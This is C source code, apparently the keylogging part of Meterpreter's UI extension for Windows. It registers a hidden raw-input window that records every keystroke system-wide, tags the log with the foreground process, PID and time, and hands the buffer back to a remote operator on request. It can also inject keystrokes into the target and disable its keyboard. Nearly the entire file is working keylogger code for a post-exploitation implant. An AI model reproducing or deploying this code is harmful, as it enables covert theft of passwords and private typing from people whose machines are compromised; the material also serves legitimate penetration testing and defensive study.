#include "precomp.h"
#include "common_metapi.h"
#include "keyboard.h"
#include <tchar.h>
#include <psapi.h>

extern HMODULE hookLibrary;
extern HINSTANCE hAppInstance;

LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam);
INT ui_log_key(UINT vKey, USHORT mCode, USHORT Flags);
INT ui_log_key_actwin(UINT vKey, USHORT mCode, USHORT Flags);
INT ui_resolve_raw_api();

/*
 * Enables or disables keyboard input
 */

DWORD request_ui_enable_keyboard(Remote *remote, Packet *request)
{
	Packet *response = met_api->packet.create_response(request);
	BOOLEAN enable = FALSE;
	DWORD result = ERROR_SUCCESS;

	enable = met_api->packet.get_tlv_value_bool(request, TLV_TYPE_BOOL);

	// If there's no hook library loaded yet
	if (!hookLibrary)
		extract_hook_library();

	// If the hook library is loaded successfully...
	if (hookLibrary)
	{
		DWORD(*enableKeyboardInput)(BOOL enable) = (DWORD(*)(BOOL))GetProcAddress(
			hookLibrary, "enable_keyboard_input");

		if (enableKeyboardInput)
			result = enableKeyboardInput(enable);
	}
	else
		result = GetLastError();

	// Transmit the response
	met_api->packet.transmit_response(result, remote, response);

	return ERROR_SUCCESS;
}

typedef enum { false = 0, true = 1 } bool;

// required function pointers

f_GetRawInputData fnGetRawInputData;
f_RegisterRawInputDevices fnRegisterRawInputDevices;
f_GetProcessImageFileNameW fnGetProcessImageFileNameW;
f_QueryFullProcessImageNameW fnQueryFullProcessImageNameW;

// this could be modified
const char g_szClassName[] = "klwClass";

// handle to main window
HANDLE tKeyScan = NULL;

// self explanatory
const unsigned int KEYBUFSIZE = 1024 * 1024;

// global keyscan logging buffer
WCHAR *g_keyscan_buf = NULL;

// index into g_keyscan_buf
size_t g_idx = 0;

// buffer containing the current active window on target
WCHAR g_active_image[MAX_PATH] = L"Logging started";

// buffer containing the previous active window on target
WCHAR g_prev_active_image[MAX_PATH] = { 0 };

// pointer to selected data collection function
INT (*gfn_log_key)(UINT, USHORT, USHORT);

// thread boundary condition
BOOL KEYSCAN_RUNNING = false;

DWORD dwThreadId;

// window handle
HWND ghwnd;

/*
 * needed for process enumeration
 */

typedef struct {
	DWORD ppid;
	DWORD cpid;
} WNDINFO;

/*
 * EnumerateChildWindows() callback
 */

BOOL CALLBACK ecw_callback(HWND hWnd, LPARAM lp) {
	WNDINFO* info = (WNDINFO*)lp;
	DWORD pid = 0;
	GetWindowThreadProcessId(hWnd, &pid);
	if (pid != info->ppid) info->cpid = pid;
	return TRUE;
}

/*
 *  keyscan_proc
 */

int WINAPI ui_keyscan_proc()
{
	WNDCLASSEX klwc;
	MSG msg;
	int ret = 0;

	if (fnGetRawInputData == NULL || fnRegisterRawInputDevices == NULL)
	{
		ret = ui_resolve_raw_api();
		if (!ret)		 // api resolution failed
		{
			return 0;
		}
	}

	// register window class
	ZeroMemory(&klwc, sizeof(WNDCLASSEX));
	klwc.cbSize = sizeof(WNDCLASSEX);
	klwc.lpfnWndProc = ui_keyscan_wndproc;
	klwc.hInstance = hAppInstance;
	klwc.lpszClassName = g_szClassName;

	if (!RegisterClassEx(&klwc))
	{
		return 0;
	}

	// create message-only window
	ghwnd = CreateWindowEx(
		0,
		g_szClassName,
		NULL,
		0,
		0, 0, 0, 0,
		HWND_MESSAGE, NULL, hAppInstance, NULL
		);

	if (!ghwnd)
	{
		return 0;
	}

	// message loop
	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	return (INT)msg.wParam;
}

LRESULT CALLBACK ui_keyscan_wndproc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	UINT dwSize;
	RAWINPUTDEVICE rid;
	RAWINPUT *buffer;

	switch (msg)
	{
		// register raw input device
	case WM_CREATE:
		rid.usUsagePage = 0x01;		// Generic Desktop Controls
		rid.usUsage = 0x06;			// Keyboard
		rid.dwFlags = RIDEV_INPUTSINK;
		rid.hwndTarget = hwnd;

		if (!fnRegisterRawInputDevices(&rid, 1, sizeof(RAWINPUTDEVICE)))
		{
			return -1;
		}

	case WM_INPUT:
		// request size of the raw input buffer to dwSize
		fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, NULL, &dwSize,
			sizeof(RAWINPUTHEADER));

		// allocate buffer for input data
		buffer = (RAWINPUT*)HeapAlloc(GetProcessHeap(), 0, dwSize);

		if (fnGetRawInputData((HRAWINPUT)lParam, RID_INPUT, buffer, &dwSize,
			sizeof(RAWINPUTHEADER)))
		{
			// if this is keyboard message and WM_KEYDOWN, log the key
			if (buffer->header.dwType == RIM_TYPEKEYBOARD
				&& buffer->data.keyboard.Message == WM_KEYDOWN)
			{
				if (gfn_log_key(buffer->data.keyboard.VKey, buffer->data.keyboard.MakeCode, buffer->data.keyboard.Flags) == -1)
					DestroyWindow(hwnd);
			}
		}

		// free the buffer
		HeapFree(GetProcessHeap(), 0, buffer);
		break;

	case WM_CLOSE:
		// reset index
		g_idx = 0;

		// torch buffer
		free(g_keyscan_buf);
		g_keyscan_buf = NULL;

		// destroy window and unregister window class
		DestroyWindow(hwnd);
		UnregisterClass(g_szClassName, hAppInstance);
		break;

	case WM_QUIT:
		return 0;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}

/*
 * Starts the keyboard sniffer
 */

DWORD request_ui_start_keyscan(Remote *remote, Packet *request)
{
	Packet *response = met_api->packet.create_response(request);
	DWORD result = ERROR_SUCCESS;

	bool track_active_window = met_api->packet.get_tlv_value_bool(request, TLV_TYPE_KEYSCAN_TRACK_ACTIVE_WINDOW);

	// set appropriate logging function
	(track_active_window == true) ? (gfn_log_key = &ui_log_key_actwin) : (gfn_log_key = &ui_log_key);

	if (KEYSCAN_RUNNING) {
		result = 1;
	}
	else {
		// Make sure we have access to the input desktop
		if (GetAsyncKeyState(0x0a) == 0) {
			// initialize g_keyscan_buf
			if (g_keyscan_buf) {
				free(g_keyscan_buf);
				g_keyscan_buf = NULL;
			}

			g_keyscan_buf = calloc(KEYBUFSIZE, sizeof(WCHAR));

			tKeyScan = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ui_keyscan_proc, NULL, 0, NULL);
			KEYSCAN_RUNNING = true;
		}
		else {
			// No permission to read key state from active desktop
			result = 5;
		}
	}

	// Transmit the response
	met_api->packet.transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}


/*
 * Stops the keyboard sniffer
 */

DWORD request_ui_stop_keyscan(Remote *remote, Packet *request)
{
	Packet *response = met_api->packet.create_response(request);
	DWORD result = ERROR_SUCCESS;

	if (tKeyScan) {
		KEYSCAN_RUNNING = false;
		SendMessageA(ghwnd, WM_CLOSE, 0, 0);
		CloseHandle(tKeyScan);
		tKeyScan = NULL;
	}
	else {
		result = 1;
	}

	// Transmit the response
	met_api->packet.transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * Returns the sniffed keystrokes (UTF-8)
 */

DWORD request_ui_get_keys_utf8(Remote *remote, Packet *request)
{
	Packet *response = met_api->packet.create_response(request);
	DWORD result = ERROR_SUCCESS;
	char *utf8_keyscan_buf = NULL;

	if (tKeyScan) {
		utf8_keyscan_buf = met_api->string.wchar_to_utf8(g_keyscan_buf);
		met_api->packet.add_tlv_raw(response, TLV_TYPE_KEYS_DUMP, (LPVOID)utf8_keyscan_buf,
			(DWORD)strlen(utf8_keyscan_buf) + 1);
		memset(g_keyscan_buf, 0, KEYBUFSIZE);

		// reset index and zero active window string so the current one
		// is logged again
		g_idx = 0;
		RtlZeroMemory(g_prev_active_image, MAX_PATH);
	}
	else {
		result = 1;
	}

	// Transmit the response
	met_api->packet.transmit_response(result, remote, response);
  free(utf8_keyscan_buf);
	return ERROR_SUCCESS;
}

/*
 * Send keystrokes
 */

DWORD request_ui_send_keys(Remote *remote, Packet *request)
{
	Packet *response = met_api->packet.create_response(request);
	DWORD result = ERROR_SUCCESS;
	wchar_t *keys = met_api->string.utf8_to_wchar(met_api->packet.get_tlv_value_string(request, TLV_TYPE_KEYS_SEND));
	if (keys) 
	{
		INPUT input[2] = {0};
		input[0].type = INPUT_KEYBOARD;
		input[0].ki.time = 0;
		input[0].ki.wVk = 0;
		input[0].ki.dwExtraInfo = 0;
		input[0].ki.dwFlags = KEYEVENTF_UNICODE;
		input[1].type = INPUT_KEYBOARD;
		input[1].ki.time = 0;
		input[1].ki.wVk = 0;
		input[1].ki.dwExtraInfo = 0;
		input[1].ki.dwFlags = KEYEVENTF_UNICODE | KEYEVENTF_KEYUP;
		wchar_t *loopkeys = keys;
		while (*loopkeys != 0) 
		{
			input[0].ki.wScan = *loopkeys;
			input[1].ki.wScan = *loopkeys;
			SendInput(2, input, sizeof(INPUT));
			loopkeys++;
		}
		free(keys);
	}
	else 
	{
		result = 1;
	}

	// Transmit the response
	met_api->packet.transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

void ui_send_key(WORD keycode, DWORD flags)
{
	INPUT input[1] = {0};
	input[0].type = INPUT_KEYBOARD;
	input[0].ki.time = 0;
	input[0].ki.wScan = MapVirtualKey(keycode, MAPVK_VK_TO_VSC);
	input[0].ki.dwExtraInfo = 0;
	input[0].ki.wVk = keycode;
	input[0].ki.dwFlags = flags;
	SendInput(1, input, sizeof(INPUT));
}

/*
 * Send key events
 */

DWORD request_ui_send_keyevent(Remote *remote, Packet *packet)
{
	Packet *response = met_api->packet.create_response(packet);
	DWORD result = ERROR_SUCCESS;
	Tlv data;

	if ((met_api->packet.get_tlv(packet, TLV_TYPE_KEYEVENT_SEND, &data)) == ERROR_SUCCESS)
	{
		for (unsigned int i=0;i<data.header.length;i+=8)
		{
			UCHAR action = data.buffer[i];
			WORD keycode = *(WORD*)&data.buffer[i+4];
			if (action == 1)
			{
				ui_send_key(keycode, 0);
			}
			else if (action == 2)
			{
				ui_send_key(keycode, KEYEVENTF_KEYUP);
			}
			else
			{
				ui_send_key(keycode, 0);
				ui_send_key(keycode, KEYEVENTF_KEYUP);
			}
		}
	}
	else 
	{
		result = 1;
	}

	// Transmit the response
	met_api->packet.transmit_response(result, remote, response);
	return ERROR_SUCCESS;
}

/*
 * log keystrokes and track active window
 */

int ui_log_key_actwin(UINT vKey, USHORT mCode, USHORT Flags)
{
	HWND foreground_wnd;
	HANDLE active_proc;
	SYSTEMTIME st;
	WNDINFO info = { 0 };
	DWORD mpsz = MAX_PATH;
	WCHAR date_s[256] = { 0 };
	WCHAR time_s[256] = { 0 };
	WCHAR gknt_buf[256] = { 0 };
	BYTE lpKeyboard[256];
	WCHAR kb[16] = { 0 };

	GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
	GetKeyboardState(lpKeyboard);

	// treat g_keyscan_buf as a circular array
	// boundary could be adjusted
	if ((g_idx + 256) >= KEYBUFSIZE)
	{
		g_idx = 0;
	}

	// get focused window pid
	foreground_wnd = GetForegroundWindow();
	GetWindowThreadProcessId(foreground_wnd, &info.ppid);
	info.cpid = info.ppid;

	// resolve full image name
	EnumChildWindows(foreground_wnd, ecw_callback, (LPARAM)&info);
	active_proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, info.cpid);

	if (active_proc) {
		// if null, we're on pre-vista or something is terribly wrong
		(fnQueryFullProcessImageNameW) ? fnQueryFullProcessImageNameW(active_proc, 0, (LPTSTR)g_active_image, &mpsz) : fnGetProcessImageFileNameW(active_proc, (LPTSTR)g_active_image, mpsz);

		// new window in focus, notate it
		if (wcscmp(g_active_image, g_prev_active_image) != 0)
		{
			GetSystemTime(&st);
			GetDateFormatW(LOCALE_SYSTEM_DEFAULT, DATE_LONGDATE, &st, NULL, date_s, sizeof(date_s));
			GetTimeFormatW(LOCALE_USER_DEFAULT, TIME_FORCE24HOURFORMAT, &st, NULL, time_s, sizeof(time_s));
			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"\n**\n-[ %s | PID: %d\n-[ @ %s %s UTC\n**\n", g_active_image, info.cpid, date_s, time_s);
			RtlZeroMemory(g_prev_active_image, MAX_PATH);
			_snwprintf(g_prev_active_image, MAX_PATH, L"%s", g_active_image);
		}
		CloseHandle(active_proc);
	}

	// needed for some wonky cases
	const bool isE0 = ((Flags & RI_KEY_E0) != 0);
	const bool isE1 = ((Flags & RI_KEY_E1) != 0);
	UINT key = (mCode << 16) | (isE0 << 24);
	BOOL ctrl_is_down = (1 << 15) & (GetAsyncKeyState(VK_CONTROL));

	switch (vKey)
	{
	case VK_CONTROL:
		// ctrl by itself, not much insight to be gained
		break;
	case VK_BACK:
		g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<^H>");
		break;
	case VK_RETURN:
		g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<CR>\r\n");
		break;
	case VK_MENU:
		if (isE0)
			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<RAlt>");
		else
			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<LAlt>");
		break;
	case VK_TAB:
		g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<Tab>");
		break;
	case VK_NUMLOCK: // pause/break and numlock both send the same message
		key = (MapVirtualKey(vKey, MAPVK_VK_TO_VSC) | 0x100);
		if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
		break;
	default:
		if (ctrl_is_down)
		{
			if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
				g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<^%ls>", gknt_buf);
		}
		else if (ToUnicodeEx(vKey, mCode, lpKeyboard, kb, 16, 0, NULL) == 1)
		{
			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"%ls", kb);
		}
		else if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
		{
			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
		}
	}

	return 0;
}

/*
 * log keystrokes - no window tracking
 */

int ui_log_key(UINT vKey, USHORT mCode, USHORT Flags)
{
	WNDINFO info = { 0 };
	DWORD mpsz = MAX_PATH;
	WCHAR date_s[256] = { 0 };
	WCHAR time_s[256] = { 0 };
	WCHAR gknt_buf[256] = { 0 };
	BYTE lpKeyboard[256];
	WCHAR kb[16] = { 0 };

	GetKeyState(VK_CAPITAL); GetKeyState(VK_SCROLL); GetKeyState(VK_NUMLOCK);
	GetKeyboardState(lpKeyboard);

	// treat g_keyscan_buf as a circular array
	// boundary could be adjusted
	if ((g_idx + 256) >= KEYBUFSIZE)
	{
		g_idx = 0;
	}

	// needed for some wonky cases
	const bool isE0 = ((Flags & RI_KEY_E0) != 0);
	const bool isE1 = ((Flags & RI_KEY_E1) != 0);
	UINT key = (mCode << 16) | (isE0 << 24);
	BOOL ctrl_is_down = (1 << 15) & (GetAsyncKeyState(VK_CONTROL));

	switch (vKey)
	{
	case VK_CONTROL:
		// ctrl by itself, not much insight to be gained
		break;
	case VK_BACK:
		g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<^H>");
		break;
	case VK_RETURN:
		g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<CR>\r\n");
		break;
	case VK_MENU:
		if (isE0)
			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<RAlt>");
		else
			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<LAlt>");
		break;
	case VK_TAB:
		g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<Tab>");
		break;
	case VK_NUMLOCK: // pause/break and numlock both send the same message
		key = (MapVirtualKey(vKey, MAPVK_VK_TO_VSC) | 0x100);
		if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
		break;
	default:
		if (ctrl_is_down)
		{
			if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
				g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<^%ls>", gknt_buf);
		}
		else if (ToUnicodeEx(vKey, mCode, lpKeyboard, kb, 16, 0, NULL) == 1)
		{
			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"%ls", kb);
		}
		else if (GetKeyNameTextW((LONG)key, (LPWSTR)gknt_buf, mpsz))
		{
			g_idx += _snwprintf(g_keyscan_buf + g_idx, KEYBUFSIZE, L"<%ls>", gknt_buf);
		}
	}
	return 0;
}

/*
 * resolve required functions
 */

int ui_resolve_raw_api()
{
	HANDLE user32 = LoadLibrary("user32.dll");
	HANDLE psapi = LoadLibrary("psapi.dll");
	HANDLE kernel32 = LoadLibrary("kernel32.dll");

	if (!user32 || !kernel32 || !psapi)
	{
		return 0;
	}

	fnQueryFullProcessImageNameW = (f_QueryFullProcessImageNameW)GetProcAddress(kernel32, "QueryFullProcessImageNameW");
	if (!fnQueryFullProcessImageNameW)
	{
		// Pre Vista -> GetProcessImageFileName
		HANDLE psapi = LoadLibrary("Psapi.dll");
		if (!psapi)
		{
			return 0;
		}
		fnGetProcessImageFileNameW = (f_GetProcessImageFileNameW)GetProcAddress(psapi, "GetProcessImageFileNameW");
		if (!fnGetProcessImageFileNameW)
		{
			return 0;
		}
	}

	fnGetProcessImageFileNameW = (f_GetProcessImageFileNameW)GetProcAddress(psapi, "GetProcessImageFileNameW");
	if (!fnGetProcessImageFileNameW)
	{
		return 0;
	}

	fnGetRawInputData = (f_GetRawInputData)GetProcAddress(user32, "GetRawInputData");
	if (fnGetRawInputData == NULL)
	{
		FreeLibrary(user32);
		return 0;
	}

	fnRegisterRawInputDevices = (f_RegisterRawInputDevices)GetProcAddress(user32, "RegisterRawInputDevices");
	if (fnRegisterRawInputDevices == NULL)
	{
		FreeLibrary(user32);
		return 0;
	}

	return 1;
}
